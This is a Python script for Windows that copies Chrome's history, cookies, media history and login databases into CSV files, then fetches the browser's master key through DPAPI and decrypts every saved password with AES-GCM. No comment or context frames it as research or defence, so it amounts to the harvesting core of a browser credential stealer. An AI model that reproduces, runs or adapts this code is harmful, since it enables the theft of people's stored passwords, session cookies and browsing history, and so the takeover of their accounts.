from os import getenv
import win32.win32crypt
import os
import sqlite3
import pandas as pd
import json
import base64
from Crypto.Cipher import AES

history_url= getenv("APPDATA") + r"\..\Local\Google\Chrome\User Data\Default\History"
cookies_url= getenv("APPDATA") + r"\..\Local\Google\Chrome\User Data\Default\Cookies"
login_url= getenv("APPDATA") + r"\..\Local\Google\Chrome\User Data\Default\Login Data"
media_history_url= getenv("APPDATA") + r"\..\Local\Google\Chrome\User Data\Default\Media History"

def create_dirs():
    try:
        os.mkdir("Files")
    except Exception:
        print("Files Are Available")
    try:
        os.mkdir("Files")
    except Exception:
        print("Files Are Available")
    try:
        os.mkdir("Files/History")
    except Exception:
        print("Files Are Available")
    try:
        os.mkdir("Files/Cookies")
    except Exception:
        print("Files Are Available")
    try:
        os.mkdir("Files/Login_Data")
    except Exception:
        print("Files Are Available")
    try:
        os.mkdir("Files/Media_History")
    except Exception:
        print("Files Are Available")       
def database():
    global history_url
    global cookies_url
    global login_url
    global media_history_url
    url = (history_url,cookies_url,login_url,media_history_url)
    folder_name = ("History","Cookies","Login_Data","Media_History")
    flag = 0
    create_dirs()
    for url_s in url:
        conn = sqlite3.connect(url_s)
        cursor = conn.cursor()
        result = cursor.execute("Select name from sqlite_master where type='table'")
        for data in result.fetchall():
            try:
                csv_file = pd.read_sql_query(f"Select * from {data[0]}",conn)
                csv_file.to_csv(f"Files\{folder_name[flag]}\{str(data[0]).capitalize()}.csv",index=False)            
                data = cursor.execute(f"Select * from {data[0]}")
            except Exception:
                print("Error In Decrypting")
        flag = flag + 1
if __name__ == "__main__":
    database()
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32.win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)
    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            pass
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    password = pd.read_csv("Files/Login_Data/Logins.csv")
    conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
    cursor = conn.cursor()
    cursor.execute('Select username_value,password_value FROM logins')
    flag = 0
    for result in cursor.fetchall():
        try:
            password_decrypted = win32.win32crypt.CryptUnprotectData(result[1],None,None,None,0)[1]
            password._set_value(flag,"password_value",password_decrypted)
        except Exception as e:
            try:
                password_decrypted = decrypt_password(result[1], master_key)
                if(password_decrypted == ""):
                    pass
                else:
                    password._set_value(flag,"password_value",password_decrypted)
            except Exception as e:
                pass
        flag = flag + 1
    password.to_csv("Files/Login_Data/Logins.csv")
